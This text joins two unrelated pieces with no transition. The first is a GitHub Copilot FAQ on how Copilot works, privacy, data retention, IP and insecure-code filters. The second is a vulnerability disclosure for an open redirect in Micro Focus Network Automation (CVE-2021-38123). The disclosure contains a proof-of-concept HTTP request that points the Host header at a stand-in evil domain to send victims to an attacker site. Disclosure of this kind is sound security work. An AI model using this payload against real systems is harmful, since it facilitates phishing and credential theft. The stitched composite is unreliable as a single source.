* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

Micro Focus Network Automation is a commercial software tool that automates network configuration and change management.

During a security audit of the product, I have found this issue.

Probably due to the number of impacted versions, this issue took the vendor 7 months to resolve.

## Vulnerability Details

### **URL Redirection to Untrusted Site (‘Open Redirect’) - CWE-601**

* **Summary:** The Host HTTP parameter could cause the web application to redirect to the specified URL, when the requested endpoint is ‘/device.save.do’. By modifying the URL value to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials.
* **Prerequisites:** None.
* **CVE and CVSS Score:** [CVE-2021-38123](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-38123) | [**6.1** (Medium)](https://nvd.nist.gov/vuln/detail/CVE-2021-38123)

**Step-by-step instructions and PoC**

The application presents an Open Redirect on the Host parameter, when the /device.save.do endpoint is requested via an HTTP POST request.

**Affected Endpoints**

* **URL:** <https://hostname/device.save.do>
* **HTTP Parameter:** Host

Below are the evidences with the vulnerability details and the payloads used.

The HTTP request is the following:

```
POST /device.save.do HTTP/1.1
Host: this.is.my.domain.evil.net
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: https://hostname
Connection: close
Referer: https://hostname/device.edit.do?deviceID=201
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

```

An attacker can send a link containing JavaScript code that allows a user who runs the code to be automatically redirected to a domain owned by the attacker himself.

The redirect is performed via the HTTP `Location` response header.

The victim is thus redirected to a malicious domain:

![Open Redirect (2)](/images/8f4aef5b444d295e4761e56a879cfb6d.png)

To perform this attack, the user does not need to be authenticated to the target application.

**Security Impact**

An attacker can construct a URL within the application that causes a redirection to an arbitrary external domain. This behavior can be leveraged to facilitate phishing attacks against users of the application. The ability to use an authentic application URL, targeting the correct domain and with a valid SSL certificate (if SSL is used), lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.
